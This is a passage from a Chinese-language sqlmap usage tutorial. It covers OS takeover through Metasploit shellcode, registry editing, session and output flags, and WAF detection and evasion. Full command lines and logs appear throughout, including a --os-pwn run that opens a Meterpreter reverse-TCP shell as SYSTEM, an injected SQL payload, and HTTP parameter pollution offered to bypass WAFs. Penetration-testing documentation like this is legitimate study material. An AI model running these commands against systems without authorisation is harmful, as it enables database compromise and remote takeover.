<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 通过用户自定义的sys_bineval()函数在内存中执行Metasplit的shellcode，支持MySQL和PostgreSQL数据库，参数：--os-pwn。</span><br><span class="line">2. 通过用户自定义的函数上传一个独立的payload执行，MySQL和PostgreSQL的sys_exec()函数，Microsoft SQL Server的xp_cmdshell()函数，参数：--os-pwn。</span><br><span class="line">3. 通过SMB攻击(MS08-068)来执行Metasploit的shellcode，当sqlmap获取到的权限足够高的时候（Linux/Unix的uid=0，Windows是Administrator），--os-smbrelay。</span><br><span class="line">4. 通过溢出Microsoft SQL Server 2000和2005的sp_replwritetovarbin存储过程(MS09-004)，在内存中执行Metasploit的payload，参数：--os-bof</span><br></pre></td></tr></table></figure>

<p>列举一个<code>MySQL</code>例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python sqlmap.py -u</span><br><span class="line">&quot;http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?id=1&quot; --os-pwn</span><br><span class="line">--msf-path /software/metasploit</span><br><span class="line">[...]</span><br><span class="line">[hh:mm:31] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Windows 2003</span><br><span class="line">web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0</span><br><span class="line">back-end DBMS: MySQL 5.0</span><br><span class="line">[hh:mm:31] [INFO] fingerprinting the back-end DBMS operating system</span><br><span class="line">[hh:mm:31] [INFO] the back-end DBMS operating system is Windows</span><br><span class="line">how do you want to establish the tunnel?</span><br><span class="line">[1] TCP: Metasploit Framework (default)</span><br><span class="line">[2] ICMP: icmpsh - ICMP tunneling</span><br><span class="line">\&gt;</span><br><span class="line">[hh:mm:32] [INFO] testing if current user is DBA</span><br><span class="line">[hh:mm:32] [INFO] fetching current user</span><br><span class="line">what is the back-end database management system architecture?</span><br><span class="line">[1] 32-bit (default)</span><br><span class="line">[2] 64-bit</span><br><span class="line">\&gt;</span><br><span class="line">[hh:mm:33] [INFO] checking if UDF &apos;sys_bineval&apos; already exist</span><br><span class="line">[hh:mm:33] [INFO] checking if UDF &apos;sys_exec&apos; already exist</span><br><span class="line">[hh:mm:33] [INFO] detecting back-end DBMS version from its banner</span><br><span class="line">[hh:mm:33] [INFO] retrieving MySQL base directory absolute path</span><br><span class="line">[hh:mm:34] [INFO] creating UDF &apos;sys_bineval&apos; from the binary UDF file</span><br><span class="line">[hh:mm:34] [INFO] creating UDF &apos;sys_exec&apos; from the binary UDF file</span><br><span class="line">how do you want to execute the Metasploit shellcode on the back-end database</span><br><span class="line">underlying</span><br><span class="line">operating system?</span><br><span class="line">[1] Via UDF &apos;sys_bineval&apos; (in-memory way, anti-forensics, default)</span><br><span class="line">[2] Stand-alone payload stager (file system way)</span><br><span class="line">\&gt;</span><br><span class="line">[hh:mm:35] [INFO] creating Metasploit Framework multi-stage shellcode</span><br><span class="line">which connection type do you want to use?</span><br><span class="line">[1] Reverse TCP: Connect back from the database host to this machine (default)</span><br><span class="line">[2] Reverse TCP: Try to connect back from the database host to this machine, on</span><br><span class="line">all ports</span><br><span class="line">between the specified and 65535</span><br><span class="line">[3] Bind TCP: Listen on the database host for a connection</span><br><span class="line">\&gt;</span><br><span class="line">which is the local address? [192.168.136.1]</span><br><span class="line">which local port number do you want to use? [60641]</span><br><span class="line">which payload do you want to use?</span><br><span class="line">[1] Meterpreter (default)</span><br><span class="line">[2] Shell</span><br><span class="line">[3] VNC</span><br><span class="line">\&gt;</span><br><span class="line">[hh:mm:40] [INFO] creation in progress ... done</span><br><span class="line">[hh:mm:43] [INFO] running Metasploit Framework command line interface locally,</span><br><span class="line">please wait..</span><br><span class="line">\_</span><br><span class="line">\| \| o</span><br><span class="line">\_ \_ \_ \_ \_\|\_ \__, , \_ \| \| \_\_ \_\|\_</span><br><span class="line">/ \|/ \|/ \| \|/ \| / \| / \\_\|/ \\_\|/ / \\_\| \|</span><br><span class="line">\| \| \|_/\|__/\|_/\\_/\|_/ \\/ \|__/ \|__/\\__/ \|_/\|_/</span><br><span class="line">/\|</span><br><span class="line">\\\|</span><br><span class="line">=[ metasploit v3.7.0-dev [core:3.7 api:1.0]</span><br><span class="line">\+ -- --=[ 674 exploits - 351 auxiliary</span><br><span class="line">\+ -- --=[ 217 payloads - 27 encoders - 8 nops</span><br><span class="line">=[ svn r12272 updated 4 days ago (2011.04.07)</span><br><span class="line">PAYLOAD =\&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">EXITFUNC =\&gt; thread</span><br><span class="line">LPORT =\&gt; 60641</span><br><span class="line">LHOST =\&gt; 192.168.136.1</span><br><span class="line">[\*] Started reverse handler on 192.168.136.1:60641</span><br><span class="line">[\*] Starting the payload handler...</span><br><span class="line">[hh:mm:48] [INFO] running Metasploit Framework shellcode remotely via UDF</span><br><span class="line">&apos;sys_bineval&apos;,</span><br><span class="line">please wait..</span><br><span class="line">[\*] Sending stage (749056 bytes) to 192.168.136.129</span><br><span class="line">[\*] Meterpreter session 1 opened (192.168.136.1:60641 -\&gt;</span><br><span class="line">192.168.136.129:1689) at Mon Apr 11</span><br><span class="line">hh:mm:52 +0100 2011</span><br><span class="line">meterpreter \&gt; Loading extension espia...success.</span><br><span class="line">meterpreter \&gt; Loading extension incognito...success.</span><br><span class="line">meterpreter \&gt; [-] The &apos;priv&apos; extension has already been loaded.</span><br><span class="line">meterpreter \&gt; Loading extension sniffer...success.</span><br><span class="line">meterpreter \&gt; System Language : en_US</span><br><span class="line">OS : Windows .NET Server (Build 3790, Service Pack 2).</span><br><span class="line">Computer : W2K3R2</span><br><span class="line">Architecture : x86</span><br><span class="line">Meterpreter : x86/win32</span><br><span class="line">meterpreter \&gt; Server username: NT AUTHORITY\\SYSTEM</span><br><span class="line">meterpreter \&gt; ipconfig</span><br><span class="line">MS TCP Loopback interface</span><br><span class="line">Hardware MAC: 00:00:00:00:00:00</span><br><span class="line">IP Address : 127.0.0.1</span><br><span class="line">Netmask : 255.0.0.0</span><br><span class="line">Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">Hardware MAC: 00:0c:29:fc:79:39</span><br><span class="line">IP Address : 192.168.136.129</span><br><span class="line">Netmask : 255.255.255.0</span><br><span class="line">meterpreter \&gt; exit</span><br><span class="line">[\*] Meterpreter session 1 closed. Reason: User exit</span><br></pre></td></tr></table></figure>

<p>默认情况下MySQL在<code>Windows</code>上以<code>SYSTEM</code>权限运行，<code>PostgreSQL</code>在<code>Windows</code>与<code>Linux</code>中是低权限运行，</p>
<p><code>Microsoft SQL Server 2000</code>默认是以<code>SYSTEM</code>权限运行与2008大部分是以<code>NETWORK SERVICE</code>有时是<code>LOCAL SERVICE</code>。</p>
<h3 id="对Windows注册表操作"><a href="#对Windows注册表操作" class="headerlink" title="对Windows注册表操作"></a>对Windows注册表操作</h3><p>当数据库为<code>MySQL，PostgreSQL</code>或<code>Microsoft SQL Server</code>，并且当前web应用支持堆查询。当然，当前连接数据库的用户也需要有权限操作注册表。</p>
<h4 id="读取注册表"><a href="#读取注册表" class="headerlink" title="读取注册表"></a>读取注册表</h4><p>参数：<code>--reg-read</code></p>
<h4 id="写入注册表"><a href="#写入注册表" class="headerlink" title="写入注册表"></a>写入注册表</h4><p>参数：<code>--reg-add</code></p>
<h4 id="删除注册表值"><a href="#删除注册表值" class="headerlink" title="删除注册表值"></a>删除注册表值</h4><p>参数：<code>--reg-del</code></p>
<h4 id="注册表辅助选项"><a href="#注册表辅助选项" class="headerlink" title="注册表辅助选项"></a>注册表辅助选项</h4><p>参数：<code>--reg-key，--reg-value，--reg-data，--reg-type</code></p>
<p>需要配合之前三个参数使用，例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">\$ python sqlmap.py -u http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1</span><br><span class="line">--reg-add --reg-key=<span class="string">"HKEY_LOCAL_MACHINE\\SOFTWARE\\sqlmap"</span> --reg-value=Test</span><br><span class="line">--reg-type=REG_SZ --reg-data=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="常规参数"><a href="#常规参数" class="headerlink" title="常规参数"></a>常规参数</h3><h4 id="从sqlite中读取session"><a href="#从sqlite中读取session" class="headerlink" title="从sqlite中读取session"></a>从sqlite中读取session</h4><p>参数：<code>-s</code></p>
<p><code>sqlmap</code>对每一个目标都会在<code>output</code>路径下自动生成一个<code>SQLite</code>文件，如果用户想指定读取的文件路径，就可以用这个参数。</p>
<h4 id="保存HTTP-S-日志"><a href="#保存HTTP-S-日志" class="headerlink" title="保存HTTP(S)日志"></a>保存HTTP(S)日志</h4><p>参数：<code>-t</code></p>
<p>这个参数需要跟一个文本文件，<code>sqlmap</code>会把<code>HTTP(S)</code>请求与响应的日志保存到那里。</p>
<h4 id="非交互模式"><a href="#非交互模式" class="headerlink" title="非交互模式"></a>非交互模式</h4><p>参数：<code>--batch</code></p>
<p>用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。</p>
<h4 id="强制使用字符编码"><a href="#强制使用字符编码" class="headerlink" title="强制使用字符编码"></a>强制使用字符编码</h4><p>参数：<code>--charset</code></p>
<p>不使用sqlmap自动识别的（如HTTP头中的Content-Type）字符编码，强制指定字符编码如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--charset=GBK</span><br></pre></td></tr></table></figure>

<h4 id="爬行网站URL"><a href="#爬行网站URL" class="headerlink" title="爬行网站URL"></a>爬行网站URL</h4><p>参数：<code>--crawl</code></p>
<p><code>sqlmap</code>可以收集潜在的可能存在漏洞的连接，后面跟的参数是爬行的深度。</p>
<p>例子：</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">"http://192.168.21.128/sqlmap/mysql/"</span> --batch --crawl=<span class="number">3</span></span><br><span class="line">[...]</span><br><span class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">53</span>] [INFO] starting crawler</span><br><span class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">53</span>] [INFO] searching <span class="keyword">for</span> links with depth <span class="number">1</span></span><br><span class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">53</span>] [WARNING] running <span class="keyword">in</span> a single-thread mode. This could take a <span class="keyword">while</span></span><br><span class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">53</span>] [INFO] searching <span class="keyword">for</span> links with depth <span class="number">2</span></span><br><span class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">54</span>] [INFO] heuristics detected web page charset <span class="string">'ascii'</span></span><br><span class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">00</span>] [INFO] <span class="number">42</span>/<span class="number">56</span> links visited (<span class="number">75</span>%)</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>

<h4 id="规定输出到CSV中的分隔符"><a href="#规定输出到CSV中的分隔符" class="headerlink" title="规定输出到CSV中的分隔符"></a>规定输出到CSV中的分隔符</h4><p>参数：<code>--csv-del</code></p>
<p>当dump保存为CSV格式时<code>（--dump-format=CSV）</code>，需要一个分隔符默认是逗号，用户也可以改为别的<br>如：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">--csv-del</span>=”<span class="comment">;”</span></span><br></pre></td></tr></table></figure>

<h4 id="DBMS身份验证"><a href="#DBMS身份验证" class="headerlink" title="DBMS身份验证"></a>DBMS身份验证</h4><p>参数：<code>--dbms-cred</code></p>
<p>某些时候当前用户的权限不够，做某些操作会失败，如果知道高权限用户的密码，可以使用此参数，有的数据库有专门的运行机制，可以切换用户如<code>MicrosoftSQL Server的OPENROWSET</code>函数</p>
<h4 id="定义dump数据的格式"><a href="#定义dump数据的格式" class="headerlink" title="定义dump数据的格式"></a>定义dump数据的格式</h4><p>参数：<code>--dump-format</code></p>
<p>输出的格式可定义为：<code>CSV，HTML，SQLITE</code></p>
<h4 id="预估完成时间"><a href="#预估完成时间" class="headerlink" title="预估完成时间"></a>预估完成时间</h4><p>参数：<code>--eta</code></p>
<p>可以计算注入数据的剩余时间。</p>
<p>例如<code>Oracle</code>的布尔型盲注：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python sqlmap.py -u</span><br><span class="line">&quot;http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1&quot; -b --eta</span><br><span class="line">[...]</span><br><span class="line">[hh:mm:01] [INFO] the back-end DBMS is Oracle</span><br><span class="line">[hh:mm:01] [INFO] fetching banner</span><br><span class="line">[hh:mm:01] [INFO] retrieving the length of query output</span><br><span class="line">[hh:mm:01] [INFO] retrieved: 64</span><br><span class="line">17% [========\&gt; ] 11/64 ETA 00:19</span><br></pre></td></tr></table></figure>

<p>然后：<br>100% [===================================================] 64/64<br>[hh:mm:53] [INFO] retrieved: Oracle Database 10g Enterprise Edition Release<br>10.2.0.1.0 - Prod<br>web application technology: PHP 5.2.6, Apache 2.2.9<br>back-end DBMS: Oracle<br>banner: ‘Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod’<br>sqlmap先输出长度，预计完成时间，显示百分比，输出字符</p>
<h4 id="刷新session文件"><a href="#刷新session文件" class="headerlink" title="刷新session文件"></a>刷新session文件</h4><p>参数：<code>--flush-session</code></p>
<p>如果不想用之前缓存这个目标的session文件，可以使用这个参数。<br>会清空之前的session，重新测试该目标。</p>
<h4 id="自动获取form表单测试"><a href="#自动获取form表单测试" class="headerlink" title="自动获取form表单测试"></a>自动获取form表单测试</h4><p>参数：<code>--forms</code></p>
<p>如果你想对一个页面的form表单中的参数测试，可以使用-r参数读取请求文件，或者通过–data参数测试。但是当使用–forms参数时，sqlmap会自动从-u中的url获取页面中的表单进行测试。</p>
<p>####忽略在会话中储存的查询结果</p>
<p>参数：<code>--fresh-queries</code></p>
<p>####使用DBMS的hex函数</p>
<p>参数：<code>--hex</code></p>
<p>有时候字符编码的问题，可能导致数据丢失，可以使用hex函数来避免：</p>
<p>针对<code>PostgreSQL</code>例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">"http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1"</span></span><br><span class="line">--banner --hex -v <span class="number">3</span> --parse-errors</span><br><span class="line">[...]</span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] fetching banner</span><br><span class="line">[xx:xx:<span class="number">14</span>] [PAYLOAD] <span class="number">1</span> AND</span><br><span class="line"><span class="number">5849</span>=CAST((CHR(<span class="number">58</span>)\|\|CHR(<span class="number">118</span>)\|\|CHR(<span class="number">116</span>)\|\|CHR(<span class="number">106</span>)\|\|CHR(<span class="number">58</span>))\|\|(ENCODE(CONVERT_TO((COALESCE(CAST(VERSION()</span><br><span class="line">AS</span><br><span class="line">CHARACTER(<span class="number">10000</span>)),(CHR(<span class="number">32</span>)))),(CHR(<span class="number">85</span>)\|\|CHR(<span class="number">84</span>)\|\|CHR(<span class="number">70</span>)\|\|CHR(<span class="number">56</span>))),(CHR(<span class="number">72</span>)\|\|CHR(<span class="number">69</span>)\|\|CHR(<span class="number">88</span>))))::text\|\|(CHR(<span class="number">58</span>)\|\|CHR(<span class="number">110</span>)\|\|CHR(<span class="number">120</span>)\|\|CHR(<span class="number">98</span>)\|\|CHR(<span class="number">58</span>))</span><br><span class="line">AS NUMERIC)</span><br><span class="line">[xx:xx:<span class="number">15</span>] [INFO] parsed error message: <span class="string">'pg_query() [\&lt;a</span></span><br><span class="line"><span class="string">href='</span>function.pg-query<span class="string">'\&gt;function.pg-query\&lt;/a\&gt;]: Query failed: ERROR: invalid</span></span><br><span class="line"><span class="string">input syntax for type numeric:</span></span><br><span class="line"><span class="string">":vtj:506f737467726553514c20382e332e39206f6e20693438362d70632d6c696e75782d676e752c20636f6d70696c656420627920474343206763632d342e332e7265616c202844656269616e2032e332e322d312e312920342e332e32:nxb:"</span></span><br><span class="line"><span class="string">in \&lt;b\&gt;/var/www/sqlmap/libs/pgsql.inc.php\&lt;/b\&gt; on line \&lt;b\&gt;35\&lt;/b\&gt;'</span></span><br><span class="line">[xx:xx:<span class="number">15</span>] [INFO] retrieved: PostgreSQL <span class="number">8.3</span><span class="number">.9</span> on i486-pc-linux-gnu, compiled by</span><br><span class="line">GCC gcc<span class="number">-4.3</span>.real (Debian <span class="number">4.3</span><span class="number">.2</span><span class="number">-1.1</span>) <span class="number">4.3</span><span class="number">.2</span></span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>

<h4 id="自定义输出路径"><a href="#自定义输出路径" class="headerlink" title="自定义输出路径"></a>自定义输出路径</h4><p>参数：<code>--output-dir</code></p>
<p>sqlmap默认把session文件跟结果文件保存在output文件夹下，用此参数可自定义输出路径<br>例如：<code>--output-dir=/tmp</code></p>
<h4 id="从响应中获取DBMS的错误信息"><a href="#从响应中获取DBMS的错误信息" class="headerlink" title="从响应中获取DBMS的错误信息"></a>从响应中获取DBMS的错误信息</h4><p>参数：<code>--parse-errors</code></p>
<p>有时目标没有关闭DBMS的报错，当数据库语句错误时，会输出错误语句，用词参数可以会显出错误信息。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">"http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1"</span></span><br><span class="line">--parse-errors</span><br><span class="line">[...]</span><br><span class="line">[<span class="number">11</span>:<span class="number">12</span>:<span class="number">17</span>] [INFO] ORDER BY technique seems to be usable. This should reduce the</span><br><span class="line">time needed to find the right number of query columns. Automatically extending</span><br><span class="line">the range <span class="keyword">for</span> current UNION query injection technique test</span><br><span class="line">[<span class="number">11</span>:<span class="number">12</span>:<span class="number">17</span>] [INFO] parsed error message: <span class="string">'Microsoft OLE DB Provider for ODBC</span></span><br><span class="line"><span class="string">Drivers (0x80040E14)</span></span><br><span class="line"><span class="string">[Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 10</span></span><br><span class="line"><span class="string">is out of range of the number of items in the select list.</span></span><br><span class="line"><span class="string">\&lt;b\&gt;/sqlmap/mssql/iis/get_int.asp, line 27\&lt;/b\&gt;'</span></span><br><span class="line">[<span class="number">11</span>:<span class="number">12</span>:<span class="number">17</span>] [INFO] parsed error message: <span class="string">'Microsoft OLE DB Provider for ODBC</span></span><br><span class="line"><span class="string">Drivers (0x80040E14)</span></span><br><span class="line"><span class="string">[Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 6 is</span></span><br><span class="line"><span class="string">out of range of the number of items in the select list.</span></span><br><span class="line"><span class="string">\&lt;b\&gt;/sqlmap/mssql/iis/get_int.asp, line 27\&lt;/b\&gt;'</span></span><br><span class="line">[<span class="number">11</span>:<span class="number">12</span>:<span class="number">17</span>] [INFO] parsed error message: <span class="string">'Microsoft OLE DB Provider for ODBC</span></span><br><span class="line"><span class="string">Drivers (0x80040E14)</span></span><br><span class="line"><span class="string">[Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 4 is</span></span><br><span class="line"><span class="string">out of range of the number of items in the select list.</span></span><br><span class="line"><span class="string">\&lt;b\&gt;/sqlmap/mssql/iis/get_int.asp, line 27\&lt;/b\&gt;'</span></span><br><span class="line">[<span class="number">11</span>:<span class="number">12</span>:<span class="number">17</span>] [INFO] target URL appears to have <span class="number">3</span> columns <span class="keyword">in</span> query</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>

<h3 id="其他的一些参数"><a href="#其他的一些参数" class="headerlink" title="其他的一些参数"></a>其他的一些参数</h3><h4 id="使用参数缩写"><a href="#使用参数缩写" class="headerlink" title="使用参数缩写"></a>使用参数缩写</h4><p>参数：<code>-z</code></p>
<p>有使用参数太长太复杂，可以使用缩写模式。 例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py --batch --random-agent --ignore-proxy --technique=BEU -u</span><br><span class="line"><span class="string">"www.target.com/vuln.php?id=1"</span></span><br></pre></td></tr></table></figure>

<p>可以写成：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -z <span class="string">"bat,randoma,ign,tec=BEU"</span> -u <span class="string">"www.target.com/vuln.php?id=1"</span></span><br></pre></td></tr></table></figure>

<p>还有：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py --ignore-proxy --flush-session --technique=U --dump -D testdb</span><br><span class="line">-T users -u <span class="string">"www.target.com/vuln.php?id=1"</span></span><br></pre></td></tr></table></figure>

<p>可以写成：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -z <span class="string">"ign,flu,bat,tec=U,dump,D=testdb,T=users"</span> -u</span><br><span class="line"><span class="string">"www.target.com/vuln.php?id=1"</span></span><br></pre></td></tr></table></figure>

<h4 id="成功sql注入时警告"><a href="#成功sql注入时警告" class="headerlink" title="成功sql注入时警告"></a>成功sql注入时警告</h4><p>参数：<code>--alert</code></p>
<h4 id="设定会发的答案"><a href="#设定会发的答案" class="headerlink" title="设定会发的答案"></a>设定会发的答案</h4><p>参数：<code>–answers</code></p>
<p>当希望<code>sqlmap</code>提出输入时，自动输入自己想要的答案可以使用此参数： 例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ python sqlmap.py -u</span><br><span class="line"><span class="string">"http://192.168.22.128/sqlmap/mysql/get_int.php?id=1"</span>--technique=E</span><br><span class="line">--answers=<span class="string">"extending=N"</span> --batch</span><br><span class="line">[...]</span><br><span class="line">[xx:xx:<span class="number">56</span>] [INFO] testing <span class="keyword">for</span> SQL injection on GET parameter <span class="string">'id'</span></span><br><span class="line">heuristic (parsing) test showed that the back-end DBMS could be <span class="string">'MySQL'</span>. Do you</span><br><span class="line">want to skip test payloads specific for other DBMSes? [Y/n] Y</span><br><span class="line">[xx:xx:<span class="number">56</span>] [INFO] do you want to include all tests <span class="keyword">for</span> <span class="string">'MySQL'</span> extending</span><br><span class="line">provided level (1) and risk (1)? [Y/n] N</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>

<h4 id="发现sql注入时发出蜂鸣声"><a href="#发现sql注入时发出蜂鸣声" class="headerlink" title="发现sql注入时发出蜂鸣声"></a>发现sql注入时发出蜂鸣声</h4><p>参数：<code>--beep</code></p>
<p>发现sql注入时，发出蜂鸣声。</p>
<h4 id="启发式检测WAF-IPS-IDS保护"><a href="#启发式检测WAF-IPS-IDS保护" class="headerlink" title="启发式检测WAF/IPS/IDS保护"></a>启发式检测WAF/IPS/IDS保护</h4><p>参数：<code>--check-waf</code></p>
<p><code>WAF/IPS/IDS</code>保护可能会对<code>sqlmap</code>造成很大的困扰，如果怀疑目标有此防护的话，可以使用此参数来测试。<code>sqlmap</code>将会使用一个不存在的参数来注入测试</p>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp;foobar=AND 1=1 UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables</span><br><span class="line">WHERE 2&gt;1</span><br></pre></td></tr></table></figure>

<p>如果有保护的话可能返回结果会不同。</p>
<h4 id="清理sqlmap的UDF-s-和表"><a href="#清理sqlmap的UDF-s-和表" class="headerlink" title="清理sqlmap的UDF(s)和表"></a>清理sqlmap的UDF(s)和表</h4><p>参数：<code>--cleanup</code></p>
<p>清除sqlmap注入时产生的udf与表。</p>
<h4 id="禁用色彩输出"><a href="#禁用色彩输出" class="headerlink" title="禁用色彩输出"></a>禁用色彩输出</h4><p>参数：<code>--disable-coloring</code></p>
<p>sqlmap默认彩色输出，可以使用此参数，禁掉彩色输出。</p>
<h4 id="使用指定的Google结果页面"><a href="#使用指定的Google结果页面" class="headerlink" title="使用指定的Google结果页面"></a>使用指定的Google结果页面</h4><p>参数：<code>--gpage</code></p>
<p>默认sqlmap使用前100个URL地址作为注入测试，结合此选项，可以指定页面的URL测试。</p>
<h4 id="使用HTTP参数污染"><a href="#使用HTTP参数污染" class="headerlink" title="使用HTTP参数污染"></a>使用HTTP参数污染</h4><p>参数：<code>--hpp</code></p>
<p>HTTP参数污染可能会绕过<code>WAF/IPS/IDS</code>保护机制，这个对<code>ASP/IIS与ASP.NET/IIS</code>平台很有效。</p>
<h4 id="测试WAF-IPS-IDS保护"><a href="#测试WAF-IPS-IDS保护" class="headerlink" title="测试WAF/IPS/IDS保护"></a>测试WAF/IPS/IDS保护</h4><p>参数：<code>--identify-waf</code></p>
<p>sqlmap可以尝试找出WAF/IPS/IDS保护，方便用户做出绕过方式。目前大约支持30种产品的识别。</p>
<p>例如对一个受到ModSecurity WAF保护的MySQL例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">"http://192.168.21.128/sqlmap/mysql/get_int.php?id=1"</span></span><br><span class="line">--identify-waf -v <span class="number">3</span></span><br><span class="line">[...]</span><br><span class="line">[xx:xx:<span class="number">23</span>] [INFO] testing connection to the target URL</span><br><span class="line">[xx:xx:<span class="number">23</span>] [INFO] heuristics detected web page charset <span class="string">'ascii'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [INFO] using WAF scripts to detect backend WAF/IPS/IDS protection</span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'USP Secure Entry Server</span></span><br><span class="line"><span class="string">(United Security Providers)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'BinarySEC Web Application</span></span><br><span class="line"><span class="string">Firewall (BinarySEC)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'NetContinuum Web</span></span><br><span class="line"><span class="string">Application Firewall (NetContinuum/Barracuda Networks)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'Hyperguard Web Application</span></span><br><span class="line"><span class="string">Firewall (art of defence Inc.)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'Cisco ACE XML Gateway</span></span><br><span class="line"><span class="string">(Cisco Systems)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'TrafficShield (F5</span></span><br><span class="line"><span class="string">Networks)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'Teros/Citrix Application</span></span><br><span class="line"><span class="string">Firewall Enterprise (Teros/Citrix Systems)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'KONA Security Solutions</span></span><br><span class="line"><span class="string">(Akamai Technologies)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'Incapsula Web Application</span></span><br><span class="line"><span class="string">Firewall (Incapsula/Imperva)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'CloudFlare Web Application</span></span><br><span class="line"><span class="string">Firewall (CloudFlare)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'Barracuda Web Application</span></span><br><span class="line"><span class="string">Firewall (Barracuda Networks)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'webApp.secure (webScurity)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'Proventia Web Application</span></span><br><span class="line"><span class="string">Security (IBM)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] declared web page charset <span class="string">'iso-8859-1'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] page <span class="keyword">not</span> found (<span class="number">404</span>)</span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'KS-WAF (Knownsec)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'NetScaler (Citrix Systems)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'Jiasule Web Application</span></span><br><span class="line"><span class="string">Firewall (Jiasule)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'WebKnight Application</span></span><br><span class="line"><span class="string">Firewall (AQTRONIX)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'AppWall (Radware)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'ModSecurity: Open Source</span></span><br><span class="line"><span class="string">Web Application Firewall (Trustwave)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [CRITICAL] WAF/IDS/IPS identified <span class="string">'ModSecurity: Open Source Web</span></span><br><span class="line"><span class="string">Application Firewall (Trustwave)'</span>. Please consider usage of tamper scripts</span><br><span class="line">(option <span class="string">'--tamper'</span>)</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>

